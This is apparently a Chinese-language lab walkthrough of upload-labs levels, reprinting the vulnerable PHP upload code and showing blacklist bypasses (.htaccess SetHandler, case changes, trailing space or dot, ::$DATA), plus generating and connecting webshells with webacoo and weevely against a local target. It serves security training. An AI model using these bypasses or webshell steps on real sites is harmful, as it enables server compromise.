<h5 id="htaccess文件介绍"><a href="#htaccess文件介绍" class="headerlink" title=".htaccess文件介绍"></a>.htaccess文件介绍</h5><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
<p>其中.htaccess文件内容：</p>
<p>SetHandler application/x-httpd-php</p>
<p>设置当前目录所有文件都是用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当做PHP执行。不符合则报错</p>
<h5 id="配置文件http-conf-1"><a href="#配置文件http-conf-1" class="headerlink" title="配置文件http.conf"></a>配置文件http.conf</h5><p>在Apache中如果需要启动.htaccess，必须在http.conf中设置 AllowOverride</p>
<p>默认情况下红框内会出现None，将None修改为All</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585712340513.png" alt="1585658574272"></p>
<h5 id="审计黑名单过滤代码"><a href="#审计黑名单过滤代码" class="headerlink" title="审计黑名单过滤代码"></a>审计黑名单过滤代码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">    &#x2F;&#x2F; 以下为黑名单，不允许的扩展名，对上传进行判定，判定如果在黑名单中，执行下面else，文件不允许上传</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传!&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在黑名单中，没有对.htaccess进行过滤，可以直接上传.htaccess来这是使用php解析任意文件。</p>
<p>.htaccess文件内容：SetHandler application/x-httpd-php</p>
<h5 id="制作图片phpinfo探针并上传"><a href="#制作图片phpinfo探针并上传" class="headerlink" title="制作图片phpinfo探针并上传"></a>制作图片phpinfo探针并上传</h5><p>将SetHandler application/x-httpd-php复制到文本另存为.htaccess</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407151641458.png" alt="image-20200407151641458"></p>
<p>页面进行上传，会返回一个空图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585720364221.png" alt="1585719758584"></p>
<p>复制图片链接，打开新的网址，会出现403，会显示</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585719831410.png" alt="1585719740191"></p>
<p>这说明你文件已经上传了，但是你没有权限去访问他</p>
<p>在上传一个图片，图片包含phpinfo探针</p>
<p>使用文本编写php代码</p>
<?php 

​    phpinfo();

?>

<p>保存为1.jpg进行上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154104175.png" alt="image-20200407154104175"></p>
<p>复制图片地址在浏览器中打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154202446.png" alt="image-20200407154202446"></p>
<h4 id="绕过黑名单验证-大小写绕过"><a href="#绕过黑名单验证-大小写绕过" class="headerlink" title="绕过黑名单验证(大小写绕过)"></a>绕过黑名单验证(大小写绕过)</h4><p>upload-labs第五关</p>
<h5 id="大小写绕过原理"><a href="#大小写绕过原理" class="headerlink" title="大小写绕过原理"></a>大小写绕过原理</h5><p>Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的</p>
<h5 id="基于黑名单验证的代码分析"><a href="#基于黑名单验证的代码分析" class="headerlink" title="基于黑名单验证的代码分析"></a>基于黑名单验证的代码分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">&#x2F;&#x2F; 黑名单中也没有大小写，例如：如果输入php会被过滤但是输入PhP就不会被过滤</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">    &#x2F;&#x2F; 过滤不包含大小写过滤</span><br><span class="line">        &#x2F;&#x2F; 将上传的文件去空格</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="直接修改后缀名php上传文件件"><a href="#直接修改后缀名php上传文件件" class="headerlink" title="直接修改后缀名php上传文件件"></a>直接修改后缀名php上传文件件</h5><p>以上代码发现大P小h大P(PhP)并没有被过滤，直接修改文件后缀名为PhP进行绕过</p>
<p>文件后缀名不一定必须在BurpSutie截断的HTTP请求中修改，可以直接修改文件后缀名进行上传</p>
<p>用burp将后缀改为大写PHP即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154604250.png" alt="image-20200407154604250"></p>
<p>放行查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154622841.png" alt="image-20200407154622841"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154646284.png" alt="image-20200407154646284"></p>
<h4 id="WebaCoo上传Webshell"><a href="#WebaCoo上传Webshell" class="headerlink" title="WebaCoo上传Webshell"></a>WebaCoo上传Webshell</h4><p>WebaCoo生成Webshell：webacoo -g -o a.php</p>
<p>上传Webshell</p>
<p>连接Webshell：webacoo -t -u Webshell地址</p>
<h5 id="在kali中使用webacoo新建一个a-php文件"><a href="#在kali中使用webacoo新建一个a-php文件" class="headerlink" title="在kali中使用webacoo新建一个a.php文件"></a>在kali中使用webacoo新建一个a.php文件</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154837626.png" alt="image-20200407154837626"></p>
<p>将文件复制到本地文件中，将后缀名改为大小写结合的PhP</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154923154.png" alt="image-20200407154923154"></p>
<p>上传复制会返回空白图片，复制图片连接，在另一个页面打开这个地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585788531529.png" alt="1585786501683"></p>
<p>复制这个地址去kali连接webshell，使用webacoo -t -u “URL”命令</p>
<p>注意：在URL中，因为是从本地copy到kali中的，本地的靶场是127.0.0.1，但在kali中没有127.0.0.1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">webacoo -t -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;a.PhP&quot;</span><br></pre></td></tr></table></figure>

<p>我们需要修改成本地地址<br>打开cmd使用ipconfig查看当前地址，将127.0.0.1改为当前地址，出现这个页面就说明连接成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407155130449.png" alt="image-20200407155130449"></p>
<p>使用ipconfig可以查看本地ip等等</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585786793204.png" alt="1585786724856"></p>
<h4 id="绕过黑名单验证-空格绕过"><a href="#绕过黑名单验证-空格绕过" class="headerlink" title="绕过黑名单验证(空格绕过)"></a>绕过黑名单验证(空格绕过)</h4><h5 id="空格绕过原理"><a href="#空格绕过原理" class="headerlink" title="空格绕过原理"></a>空格绕过原理</h5><p><strong>Winodws系统</strong>下，对于文件名中空格会被作为空处理，程序中的监测代码如果不能自动删除空格，这样就可以利用空格绕过黑名单</p>
<p>针对这样的情况需要使用Burpsuite截断HTTP请求之后，修改对应的文件名 添加空格</p>
<h5 id="基于黑名单验证代码分析-1"><a href="#基于黑名单验证代码分析-1" class="headerlink" title="基于黑名单验证代码分析"></a>基于黑名单验证代码分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">     #这里并没有使用$file_ext&#x3D;trim($file_ext);来进行收尾去空的操作，可以使用空格绕过</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="BurpSuite绕过黑名单验证-1"><a href="#BurpSuite绕过黑名单验证-1" class="headerlink" title="BurpSuite绕过黑名单验证"></a>BurpSuite绕过黑名单验证</h5><p>利用BurpSuite工具截断HTTP请求，对上传的文件名后加空格</p>
<p>上传一个带有一句话木马的文件，使用BurpSuite抓包，加上空格</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585788446309.png" alt="1585788386815"></p>
<p>forward进行放行，返回空白图，复制图片连接，打开新的页面将其复制运行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407155613012.png" alt="image-20200407155613012"></p>
<p>运行完成后复制地址，打开，成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407155801225.png" alt="image-20200407155801225"></p>
<h4 id="WebShell生成与上传"><a href="#WebShell生成与上传" class="headerlink" title="WebShell生成与上传"></a>WebShell生成与上传</h4><p>-g 表示生成</p>
<p>-o 输出到webshell.php</p>
<p>可以使用webacoo生成webshell：webacoo -g -o webshell.php</p>
<p>BurpSuite截断HTTP请求 ，修改对应的文件名，添加空格</p>
<p>-t 表示使用终端，链接之后反弹回来的可以执行cmd的终端</p>
<p>-u 表示URL</p>
<p>使用Webacoo连个上传成功地webshell：webacoo -t -u “URL”</p>
<h5 id="使用webacoo生成一个webshell"><a href="#使用webacoo生成一个webshell" class="headerlink" title="使用webacoo生成一个webshell"></a>使用webacoo生成一个webshell</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407160104577.png" alt="image-20200407160104577"></p>
<p>页面上传并拦截，在文件或加空格绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407160149272.png" alt="image-20200407160149272"></p>
<h5 id="复制图片连接打开新的页面，将地址复制，查看。页面返回空白"><a href="#复制图片连接打开新的页面，将地址复制，查看。页面返回空白" class="headerlink" title="复制图片连接打开新的页面，将地址复制，查看。页面返回空白"></a>复制图片连接打开新的页面，将地址复制，查看。页面返回空白</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407160258571.png" alt="image-20200407160258571"></p>
<h5 id="win-r打开cmd，查看当前ip，然后将图片地址复制，将其中的127-0-0-1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确"><a href="#win-r打开cmd，查看当前ip，然后将图片地址复制，将其中的127-0-0-1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确" class="headerlink" title="win+r打开cmd，查看当前ip，然后将图片地址复制，将其中的127.0.0.1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确"></a>win+r打开cmd，查看当前ip，然后将图片地址复制，将其中的127.0.0.1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407160419396.png" alt="image-20200407160419396"></p>
<p>可以使用cmd命令</p>
<p>netstat -an命令式查看所有和本地计算机建立连接的IP</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407160448463.png" alt="image-20200407160448463"></p>
<h4 id="绕过黑名单验证-号绕过"><a href="#绕过黑名单验证-号绕过" class="headerlink" title="绕过黑名单验证(.号绕过)"></a>绕过黑名单验证(.号绕过)</h4><p>upload-labs第七关</p>
<h5 id="号绕过原理"><a href="#号绕过原理" class="headerlink" title=".号绕过原理"></a>.号绕过原理</h5><p>Windows系统下，文件后缀名最后一个点会被自动去除</p>
<p>例如：在桌面新建一个1.php. 系统会自动删除最后一个点</p>
<h5 id="基于黑名单验证代码分析-2"><a href="#基于黑名单验证代码分析-2" class="headerlink" title="基于黑名单验证代码分析"></a>基于黑名单验证代码分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        &#x2F;&#x2F; 加入去空格处理，不能使用空格绕过</span><br><span class="line">        &#x2F;&#x2F; 但是没有删除deldot这个.号，这样就可以利用Windows特性进行.号绕过</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        &#x2F;&#x2F; 进行了大小写转换，也不能进行大小写绕过</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="BurpSuite绕过黑名单验证-2"><a href="#BurpSuite绕过黑名单验证-2" class="headerlink" title="BurpSuite绕过黑名单验证"></a>BurpSuite绕过黑名单验证</h5><p>上传php文件，使用burp抓包，在文件后加上.号，放行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161029364.png" alt="image-20200407161029364"></p>
<p>返回空白文档，复制图片地址，在新页面打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161059182.png" alt="image-20200407161059182"></p>
<h4 id="生成并上传webshell"><a href="#生成并上传webshell" class="headerlink" title="生成并上传webshell"></a>生成并上传webshell</h4><h5 id="1、生成：weevely-generate-密码-路径-文件名"><a href="#1、生成：weevely-generate-密码-路径-文件名" class="headerlink" title="1、生成：weevely generate 密码 路径 文件名"></a>1、生成：weevely generate 密码 路径 文件名</h5><p>使用weevely生成webshell</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161239452.png" alt="image-20200407161239452"></p>
<h5 id="2、上传"><a href="#2、上传" class="headerlink" title="2、上传"></a>2、上传</h5><p>上传使用burp抓包加.放行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161329461.png" alt="image-20200407161329461"></p>
<p>复制图片地址，在新的页面运行</p>
<h5 id="3、连接：weevely-shell文件地址-密码"><a href="#3、连接：weevely-shell文件地址-密码" class="headerlink" title="3、连接：weevely shell文件地址 密码"></a>3、连接：weevely shell文件地址 密码</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161536416.png" alt="image-20200407161536416"></p>
<p>可以使用help查看一下帮助信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161559965.png" alt="image-20200407161559965"></p>
<p>查看其中的一个net_scan端口扫描</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161644586.png" alt="image-20200407161644586"></p>
<p>使用system_info</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161737393.png" alt="image-20200407161737393"></p>
<h4 id="绕过黑名单验证-特殊符号"><a href="#绕过黑名单验证-特殊符号" class="headerlink" title="绕过黑名单验证(特殊符号)"></a>绕过黑名单验证(特殊符号)</h4><p>upload-labs第八关</p>
<h5 id="1、特殊符号绕过原理"><a href="#1、特殊符号绕过原理" class="headerlink" title="1、特殊符号绕过原理"></a>1、特殊符号绕过原理</h5><p>Windows系统下，如果上传的文件名中test.php::$DATA会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析</p>
<p>例如：在windows系统下新建一个文件名为1.php::$DATA的文件，查看效果。但是在Window下新建的文件名中，包含特殊符号不能成功新建</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585798158128.png" alt="image-20200405083527548"></p>
<p>因为在Windows下不能建带有特殊符号的文本，所以在kali中新建</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405082756442.png" alt="1585798158128"></p>
<h5 id="2、基于黑名单验证代码分析"><a href="#2、基于黑名单验证代码分析" class="headerlink" title="2、基于黑名单验证代码分析"></a>2、基于黑名单验证代码分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F; 去空格，去末尾的点，转换大小写，首尾去空</span><br><span class="line">        &#x2F;&#x2F; 并没有黑名单过滤::这个符号和$DATA这个变量(::$DATA)</span><br><span class="line">        &#x2F;&#x2F; $DATA这个变量是ADS NTFS系统，所具有的一种格式，数据流</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果在Windows下使用1.php::$DATA系统会直接修改为,1.php，去掉::$DATA，因为Windows不支持文件有特殊符号，通过这种方式就可以绕过黑名单检测，以后在检测黑名单时一定要将这个内容去除掉，否则黑名单很容易被绕过。。。当然过滤时不推荐使用黑名单，推荐白名单，毕竟黑名单出现的漏洞太多。</p>
<h5 id="3、直接上传1-php-DATA"><a href="#3、直接上传1-php-DATA" class="headerlink" title="3、直接上传1.php::$DATA"></a>3、直接上传1.php::$DATA</h5><p>上传带有特殊符号的php文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083527548.png" alt="image-20200405083301173"></p>
<p>页面返回空白图片</p>
